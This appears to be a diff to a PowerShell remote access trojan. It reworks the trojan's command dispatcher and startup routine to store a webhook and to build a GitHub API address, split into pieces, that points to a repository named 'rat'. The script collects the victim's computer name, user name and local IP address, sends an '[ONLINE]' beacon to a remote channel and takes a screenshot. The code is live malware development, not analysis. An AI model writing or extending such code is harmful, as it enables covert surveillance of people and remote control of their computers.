@@ -314,9 +314,12 @@ $f.ShowDialog()
 # ---- Command dispatcher ----
 function Run-Cmd($c){
   try{
-    if($c -like 'hook:*'){
-      $W=$c.Substring(5)
-      Set-Content $HF $W -Force
+    if($c -like 'setup:*'){
+      $rest=$c.Substring(6)
+      $parts=$rest -split ';', 2
+      $W=$parts[0]
+      $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$parts[1]
+      Set-Content $HF ($W + "`n" + $parts[1]) -Force
       Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
       Shot
     }
@@ -383,7 +386,9 @@ $VN=$env:COMPUTERNAME
 $VU=$env:USERNAME
 $VI=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
 if(Test-Path $HF){
-  $W=(Get-Content $HF -Raw).Trim()
+  $hf=Get-Content $HF
+  $W=$hf[0]
+  $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$hf[1]
   Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
   Shot
 }else{
